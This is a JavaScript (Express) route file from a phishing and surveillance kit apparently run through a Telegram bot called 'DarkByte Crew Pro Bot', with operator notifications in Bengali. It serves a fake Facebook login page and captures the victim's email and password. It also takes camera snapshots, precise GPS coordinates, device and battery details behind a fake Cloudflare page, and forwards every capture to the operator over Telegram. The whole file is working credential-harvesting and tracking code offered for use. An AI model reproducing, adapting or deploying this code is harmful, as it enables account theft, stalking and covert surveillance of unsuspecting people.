const express = require('express');
const router = express.Router();
const path = require('path');
const database = require('../../utils/database');
const helpers = require('../../utils/helpers');
const logger = require('../../utils/logger');
const bot = require('../../bot/bot');

// Facebook phishing page
router.get('/fb/:linkId', async (req, res) => {
    const linkId = req.params.linkId;
    const ip = helpers.extractClientIp(req);
    const ua = req.headers['user-agent'];

    try {
        // Check if link exists and is active
        const link = await database.query(
            'SELECT * FROM links WHERE link_id = ? AND is_active = TRUE',
            [linkId]
        );

        if (link.length === 0) {
            return res.status(404).send('Link not found or expired');
        }

        // Log visitor
        await database.query(
            `INSERT INTO visitors (link_id, ip_address, device, browser) 
             VALUES (?, ?, ?, ?)`,
            [linkId, ip, ua, ua]
        );

        // Update visit count
        await database.query(
            'UPDATE links SET total_visits = total_visits + 1 WHERE link_id = ?',
            [linkId]
        );

        // Get geo info
        const geoInfo = helpers.getIpInfo(ip);

        // Notify user about visitor
        const user = await database.query(
            'SELECT user_id FROM links WHERE link_id = ?',
            [linkId]
        );

        if (user.length > 0) {
            try {
                await bot.bot.sendMessage(user[0].user_id,
                    `👁️ 𝐍𝐄𝐖 𝐕𝐈𝐒𝐈𝐓𝐎𝐑 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃\n\n` +
                    `লিঙ্ক আইডি: ${linkId}\n` +
                    `ভিকটিম আইপি: ${ip}\n` +
                    `লোকেশন: ${geoInfo.city}, ${geoInfo.country}\n` +
                    `ডিভাইস: ${helpers.getUserAgentInfo(ua).browser}\n` +
                    `সময়: ${new Date().toLocaleString('bn-BD')}`
                );
            } catch (e) {}
        }

        // Render facebook clone page
        res.render('facebook', {
            linkId: linkId,
            baseUrl: process.env.BASE_URL
        });

    } catch (error) {
        console.error('FB page error:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Handle Facebook data submission
router.post('/fb/submit', async (req, res) => {
    const { linkId, email, password } = req.body;
    const ip = helpers.extractClientIp(req);
    const ua = req.headers['user-agent'];

    try {
        // Get geo info
        const geoInfo = helpers.getIpInfo(ip);
        const userAgentInfo = helpers.getUserAgentInfo(ua);

        // Save data
        await database.query(
            `INSERT INTO collected_data (link_id, data_type, data_content, ip_address) 
             VALUES (?, 'facebook', ?, ?)`,
            [linkId, JSON.stringify({
                email,
                password,
                ip,
                city: geoInfo.city,
                country: geoInfo.country,
                device: userAgentInfo.browser,
                time: new Date().toISOString()
            }), ip]
        );

        // Update data count
        await database.query(
            'UPDATE links SET total_data = total_data + 1 WHERE link_id = ?',
            [linkId]
        );

        // Update user's total data
        await database.query(
            `UPDATE users u 
             JOIN links l ON u.user_id = l.user_id 
             SET u.total_data = u.total_data + 1 
             WHERE l.link_id = ?`,
            [linkId]
        );

        // Notify user
        const link = await database.query(
            'SELECT user_id FROM links WHERE link_id = ?',
            [linkId]
        );

        if (link.length > 0) {
            try {
                await bot.bot.sendMessage(link[0].user_id,
                    `🔐 𝐍𝐄𝐖 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐃𝐀𝐓𝐀 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃\n\n` +
                    `📧 ইমেইল: ${email}\n` +
                    `🔑 পাসওয়ার্ড: ${password}\n` +
                    `🌍 আইপি: ${ip}\n` +
                    `📍 লোকেশন: ${geoInfo.city}, ${geoInfo.country}\n` +
                    `📱 ডিভাইস: ${userAgentInfo.browser}\n` +
                    `🕐 টাইম: ${new Date().toLocaleString('bn-BD')}\n\n` +
                    `📌 লিঙ্ক আইডি: ${linkId}`
                );
            } catch (e) {}
        }

        // Redirect to Facebook
        res.redirect('https://facebook.com');

    } catch (error) {
        console.error('FB submit error:', error);
        res.redirect('https://facebook.com');
    }
});

// Camera capture page
router.get('/camera/:linkId', async (req, res) => {
    const linkId = req.params.linkId;

    try {
        const link = await database.query(
            'SELECT * FROM links WHERE link_id = ? AND is_active = TRUE',
            [linkId]
        );

        if (link.length === 0) {
            return res.status(404).send('Link not found or expired');
        }

        res.render('camera', {
            linkId: linkId,
            baseUrl: process.env.BASE_URL
        });

    } catch (error) {
        console.error('Camera page error:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Handle camera capture
router.post('/camera/capture', async (req, res) => {
    const { linkId, image } = req.body;
    const ip = helpers.extractClientIp(req);

    try {
        // Save image data (base64)
        const geoInfo = helpers.getIpInfo(ip);

        await database.query(
            `INSERT INTO collected_data (link_id, data_type, data_content, ip_address) 
             VALUES (?, 'camera', ?, ?)`,
            [linkId, JSON.stringify({
                image: image.substring(0, 100) + '...', // Store only preview
                timestamp: new Date().toISOString(),
                ip,
                location: `${geoInfo.city}, ${geoInfo.country}`
            }), ip]
        );

        // Update counts
        await database.query(
            'UPDATE links SET total_data = total_data + 1 WHERE link_id = ?',
            [linkId]
        );

        // Notify user
        const link = await database.query(
            'SELECT user_id FROM links WHERE link_id = ?',
            [linkId]
        );

        if (link.length > 0) {
            try {
                await bot.bot.sendMessage(link[0].user_id,
                    `📸 𝐍𝐄𝐖 𝐂𝐀𝐌𝐄𝐑𝐀 𝐂𝐀𝐏𝐓𝐔𝐑𝐄\n\n` +
                    `লিঙ্ক আইডি: ${linkId}\n` +
                    `টাইমস্ট্যাম্প: ${new Date().toLocaleString('bn-BD')}\n` +
                    `আইপি: ${ip}\n` +
                    `লোকেশন: ${geoInfo.city}, ${geoInfo.country}\n\n` +
                    `🔄 অটো-ফরওয়ার্ডেড`
                );
            } catch (e) {}
        }

        res.json({ success: true });

    } catch (error) {
        console.error('Camera capture error:', error);
        res.status(500).json({ success: false });
    }
});

// All-in-one page
router.get('/all/:linkId', async (req, res) => {
    const linkId = req.params.linkId;

    try {
        const link = await database.query(
            'SELECT * FROM links WHERE link_id = ? AND is_active = TRUE',
            [linkId]
        );

        if (link.length === 0) {
            return res.status(404).send('Link not found or expired');
        }

        res.render('all', {
            linkId: linkId,
            baseUrl: process.env.BASE_URL
        });

    } catch (error) {
        console.error('All page error:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Custom redirect with Cloudflare simulation
router.get('/custom/:linkId', async (req, res) => {
    const linkId = req.params.linkId;
    const targetUrl = req.query.url;

    if (!targetUrl) {
        return res.status(400).send('No target URL specified');
    }

    try {
        const link = await database.query(
            'SELECT * FROM links WHERE link_id = ? AND is_active = TRUE',
            [linkId]
        );

        if (link.length === 0) {
            return res.status(404).send('Link not found or expired');
        }

        res.render('cloudflare', {
            linkId: linkId,
            targetUrl: decodeURIComponent(targetUrl),
            baseUrl: process.env.BASE_URL
        });

    } catch (error) {
        console.error('Custom page error:', error);
        res.status(500).send('Internal Server Error');
    }
});

// API endpoint for device info
router.post('/api/collect', async (req, res) => {
    const { linkId, type, data } = req.body;
    const ip = helpers.extractClientIp(req);
    const ua = req.headers['user-agent'];

    try {
        const geoInfo = helpers.getIpInfo(ip);
        const userAgentInfo = helpers.getUserAgentInfo(ua);

        // Add IP and location to data
        data.ip = ip;
        data.location = `${geoInfo.city}, ${geoInfo.country}`;
        data.userAgent = userAgentInfo;

        await database.query(
            `INSERT INTO collected_data (link_id, data_type, data_content, ip_address) 
             VALUES (?, ?, ?, ?)`,
            [linkId, type, JSON.stringify(data), ip]
        );

        // Update counts
        await database.query(
            'UPDATE links SET total_data = total_data + 1 WHERE link_id = ?',
            [linkId]
        );

        // Notify user
        const link = await database.query(
            'SELECT user_id FROM links WHERE link_id = ?',
            [linkId]
        );

        if (link.length > 0) {
            let message = '';
            if (type === 'info') {
                message = 
                    `📱 𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎 𝐂𝐀𝐏𝐓𝐔𝐑𝐄𝐃\n\n` +
                    `🌐 আইপি: ${ip}\n` +
                    `📍 লোকেশন: ${geoInfo.city}, ${geoInfo.country}\n` +
                    `📱 ডিভাইস: ${userAgentInfo.browser} on ${userAgentInfo.os}\n` +
                    `📶 নেটওয়ার্ক: ${data.connection || 'Unknown'}\n` +
                    `🔋 ব্যাটারি: ${data.battery || 'Unknown'}%\n` +
                    `🕐 টাইম: ${new Date().toLocaleString('bn-BD')}`;
            } else if (type === 'location') {
                message = 
                    `📍 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐂𝐀𝐏𝐓𝐔𝐑𝐄𝐃\n\n` +
                    `🗺️ গুগল ম্যাপ:\n` +
                    `https://www.google.com/maps?q=${data.lat},${data.lng}\n\n` +
                    `📌 কোঅর্ডিনেটস:\n` +
                    `ল্যাট: ${data.lat}\n` +
                    `লং: ${data.lng}\n` +
                    `একুরেসি: ${data.accuracy} মিটার\n\n` +
                                       `🌍 লোকেশন: ${geoInfo.city}, ${geoInfo.country}\n` +
                    `📱 ডিভাইস: ${userAgentInfo.browser}\n` +
                    `🕐 টাইম: ${new Date().toLocaleString('bn-BD')}`;
            }

            try {
                await bot.bot.sendMessage(link[0].user_id, message);
            } catch (e) {}
        }

        res.json({ success: true });

    } catch (error) {
        console.error('API collect error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Location capture endpoint
router.post('/api/location', async (req, res) => {
    const { linkId, lat, lng, accuracy } = req.body;
    const ip = helpers.extractClientIp(req);
    const ua = req.headers['user-agent'];

    try {
        const geoInfo = helpers.getIpInfo(ip);
        const userAgentInfo = helpers.getUserAgentInfo(ua);

        await database.query(
            `INSERT INTO collected_data (link_id, data_type, data_content, ip_address) 
             VALUES (?, 'location', ?, ?)`,
            [linkId, JSON.stringify({
                lat,
                lng,
                accuracy,
                timestamp: new Date().toISOString(),
                ip,
                city: geoInfo.city,
                country: geoInfo.country,
                device: userAgentInfo.browser
            }), ip]
        );

        await database.query(
            'UPDATE links SET total_data = total_data + 1 WHERE link_id = ?',
            [linkId]
        );

        const link = await database.query(
            'SELECT user_id FROM links WHERE link_id = ?',
            [linkId]
        );

        if (link.length > 0) {
            try {
                await bot.bot.sendMessage(link[0].user_id,
                    `📍 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐂𝐀𝐏𝐓𝐔𝐑𝐄𝐃\n\n` +
                    `🗺️ গুগল ম্যাপ:\n` +
                    `https://www.google.com/maps?q=${lat},${lng}\n\n` +
                    `📌 কোঅর্ডিনেটস:\n` +
                    `ল্যাটিটিউড: ${lat}\n` +
                    `লংগিটিউড: ${lng}\n` +
                    `একুরেসি: ${accuracy} মিটার\n\n` +
                    `🌍 লোকেশন ডিটেইলস:\n` +
                    `এলাকা: ${geoInfo.city}\n` +
                    `সিটি: ${geoInfo.city}\n` +
                    `কান্ট্রি: ${geoInfo.country}\n` +
                    `আইপি: ${ip}\n\n` +
                    `📱 ডিভাইস ইনফো:\n` +
                    `ডিভাইস: ${userAgentInfo.browser}\n` +
                    `ব্রাউজার: ${userAgentInfo.browser}\n` +
                    `📌 লিঙ্ক আইডি: ${linkId}`
                );
            } catch (e) {}
        }

        res.json({ success: true });

    } catch (error) {
        console.error('Location API error:', error);
        res.status(500).json({ success: false });
    }
});

// Handle short link redirects
router.get('/s/:code', async (req, res) => {
    const code = req.params.code;

    try {
        const link = await database.query(
            'SELECT * FROM shortened_links WHERE short_code = ?',
            [code]
        );

        if (link.length === 0) {
            return res.status(404).send('Short link not found');
        }

        // Update click count
        await database.query(
            'UPDATE shortened_links SET total_clicks = total_clicks + 1 WHERE short_code = ?',
            [code]
        );

        res.redirect(link[0].original_url);

    } catch (error) {
        console.error('Short link error:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Health check endpoint
router.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        bot: 'DarkByte Crew Pro Bot'
    });
});

module.exports = router;